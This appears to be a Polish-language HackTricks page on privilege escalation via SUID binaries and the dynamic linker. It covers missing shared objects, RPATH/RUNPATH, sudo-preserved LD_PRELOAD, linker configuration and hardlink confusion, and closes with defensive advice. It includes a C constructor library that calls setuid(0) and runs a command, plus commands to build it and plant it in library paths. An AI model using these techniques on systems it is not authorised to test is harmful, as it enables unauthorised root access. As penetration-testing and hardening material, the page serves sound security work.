# Nadużycia SUID Shared Library i Linkera

{{#include ../../banners/hacktricks-training.md}}

Pliki binarne SUID są zwykle sprawdzane pod kątem bezpośredniego wykonywania poleceń, ale niestandardowe programy SUID mogą być również podatne na ataki za pośrednictwem dynamicznego linkera. Wspólny schemat jest prosty: uprzywilejowany plik wykonywalny ładuje kod ze ścieżki lub konfiguracji, na które użytkownik o niższych uprawnieniach może wpływać.

Ta strona koncentruje się na ogólnych wzorcach technik: brakujące biblioteki, zapisywalne katalogi bibliotek, `RPATH`/`RUNPATH`, `LD_PRELOAD` za pośrednictwem sudo, konfiguracja linkera oraz pomyłki związane z hardlinkami SUID.

## Szybka enumeracja

Zacznij od znalezienia nietypowych plików SUID i sprawdzenia, czy są dynamicznie linkowane:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Skup się na niestandardowych lokalizacjach, niestandardowych ścieżkach aplikacji, plikach binarnych należących do użytkownika root, ale znajdujących się poza katalogami zarządzanymi przez menedżera pakietów, oraz zależnościach ładowanych z katalogów, do których można zapisywać.

Przydatne polecenia sprawdzające możliwość zapisu:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Niektóre niestandardowe pliki binarne SUID próbują załadować shared object, który nie istnieje. Jeśli brakująca ścieżka znajduje się w katalogu kontrolowanym przez atakującego, plik binarny może załadować kod dostarczony przez atakującego jako użytkownik efektywny.

Znajdź nieudane wyszukiwania bibliotek:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Jeśli plik binarny przeszukuje zapisywalną ścieżkę w poszukiwaniu `libexample.so`, minimalna biblioteka demonstracyjna może używać konstruktora. Podczas walidacji zachowaj nieszkodliwy proof-of-impact:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Zbuduj ją z dokładną nazwą pliku, którą próbuje załadować plik binarny:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Warunkiem umożliwiającym exploit nie jest samo brakujące library. Attacker musi mieć możliwość umieszczenia zgodnego shared object w ścieżce akceptowanej przez uprzywilejowany loader.

## Zapisywalny katalog library

Czasami wszystkie dependencies istnieją, ale jeden z katalogów używanych do ich rozwiązywania jest zapisywalny. Może to umożliwić zastąpienie załadowanego library lub umieszczenie library o wyższym priorytecie i tej samej nazwie.

Przejrzyj ścieżki dependencies:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Jeśli katalog jest zapisywalny, zweryfikuj to w laboratorium, korzystając z podejścia bezpiecznego dla kopii. Zastąpienie bibliotek systemowych na działającym hoście może zakłócić uwierzytelnianie, zarządzanie pakietami lub usługi krytyczne dla uruchamiania systemu.

## RPATH i RUNPATH

`RPATH` i `RUNPATH` to wpisy sekcji dynamicznej, które informują loader, gdzie szukać bibliotek. Są niebezpieczne w programach SUID, gdy wskazują na katalogi zapisywalne przez attackera.

Wykryj je:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Przykładowe ryzykowne wyjście:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Jeśli katalog `/opt/app/lib` jest zapisywalny, a binary wymaga `libcustom.so`, attacker może umieścić tam złośliwy plik `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nie są identyczne pod względem wszystkich szczegółów rozwiązywania, ale w przypadku przeglądu pod kątem privilege-escalation praktyczne pytanie pozostaje takie samo: czy binarny plik SUID przeszukuje katalog, w którym attacker może zapisywać, w poszukiwaniu nazwy biblioteki?

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

W przypadku zwykłych programów `LD_PRELOAD` i `LD_LIBRARY_PATH` mogą wymuszać lub wpływać na ładowanie shared object. W przypadku programów SUID dynamic loader zwykle przechodzi w tryb secure-execution i ignoruje niebezpieczne zmienne środowiskowe.

Oznacza to, że zwykły binarny plik SUID zazwyczaj nie jest podatny tylko dlatego, że użytkownik może ustawić `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Typowym wyjątkiem jest błędna konfiguracja sudo. Jeśli `sudo -l` pokazuje, że zachowywana jest zmienna taka jak `LD_PRELOAD` lub `LD_LIBRARY_PATH`, polecenie dozwolone przez sudo może załadować kod kontrolowany przez atakującego:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Nie należy mylić następujących przypadków:

- `LD_PRELOAD` w odniesieniu do zwykłego pliku binarnego SUID: zazwyczaj blokowane przez secure execution.
- `LD_PRELOAD` zachowane przez sudo: potencjalnie exploitable.
- Brakujący plik `.so` w zapisywalnej ścieżce: exploitable, gdy plik binarny SUID naturalnie ładuje tę ścieżkę.
- `RPATH`/`RUNPATH` wskazujące na zapisywalny katalog: exploitable, gdy można kontrolować wymaganą bibliotekę.
- Uprawnienia zapisu do `/etc/ld.so.preload` lub konfiguracji linkera: zakres systemowy i wysoki wpływ.

## Konfiguracja linkera

Dynamiczny linker odczytuje również konfigurację systemową, taką jak `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cache linkera oraz w niektórych przypadkach `/etc/ld.so.preload`.

Kontrole o wysokiej wartości:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Find SUID files with more than one link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Sprawdź wszystkie ścieżki do tego samego inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Nadużycie nie polega na tym, że hardlink zmienia uprawnienia. Nadużycie polega na pomyleniu ścieżki: uprzywilejowany inode może być dostępny za pośrednictwem nazwy, której obrońcy lub skrypty się nie spodziewają. Aby uzyskać bardziej szczegółowe informacje o inode i workflow hardlinków, zobacz [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Uwagi dotyczące obrony

- Utrzymuj pliki binarne SUID jako minimalne, poddawane audytowi i, w miarę możliwości, zarządzane przez system pakietów.
- Unikaj wpisów `RPATH`/`RUNPATH` wskazujących na katalogi zapisywalne lub zarządzane przez aplikacje.
- Utrzymuj katalogi bibliotek jako należące do roota i niezapisywalne przez zwykłych użytkowników.
- Nie zachowuj `LD_PRELOAD`, `LD_LIBRARY_PATH` ani podobnych zmiennych loadera za pośrednictwem sudo.
- Monitoruj `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` oraz nieoczekiwane pliki SUID.
- Sprawdzaj pliki SUID połączone hardlinkami i badaj niestandardowe wrappery SUID znajdujące się poza standardowymi ścieżkami systemowymi.

{{#include ../../banners/hacktricks-training.md}}
